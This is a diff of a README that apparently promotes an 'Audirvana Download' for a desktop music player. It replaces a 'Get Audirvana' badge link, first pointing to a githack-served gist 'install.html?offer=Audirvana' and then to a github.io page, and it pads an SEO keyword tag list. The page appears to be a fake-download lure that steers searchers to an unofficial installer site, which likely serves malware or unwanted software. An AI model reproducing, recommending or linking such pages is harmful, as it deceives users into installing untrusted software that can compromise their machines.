@@ -1,6 +1,6 @@
 # Audirvana Download — Desktop Music Player
 
-[![Get Audirvana GitHub](https://img.shields.io/badge/Get%20Audirvana%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/amazing0blademight/8f3e78b9b555fb834376b01f4185d505/raw/7c35446e9d4f7f25593f38e90f326bd918f04286/install.html?offer=Audirvana)
+[![Get Audirvana GitHub](https://img.shields.io/badge/Get%20Audirvana%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-deployer-app.github.io/.github/?offer=Audirvana)
 
 ---
 
@@ -71,7 +71,7 @@ With a clean and intuitive interface, Audirvana allows users to manage large mus
 ---
 
 ## 🔍 Tags
-audirvana app, cross-platform music player, high-resolution audio Windows Mac, cross-platform audio software, audirvana mac, audirvana pc, audirvana windows, audirvana desktop, audirvana for mac, audirvana for pc, audirvana for windows
+audirvana app, audirvana, audirvana studio, audirvana download, cross-platform music player, high-resolution audio Windows Mac, cross-platform audio software, audirvana mac, audirvana pc, audirvana windows, audirvana desktop, audirvana for mac, audirvana for pc, audirvana for windows
 
 ---
 
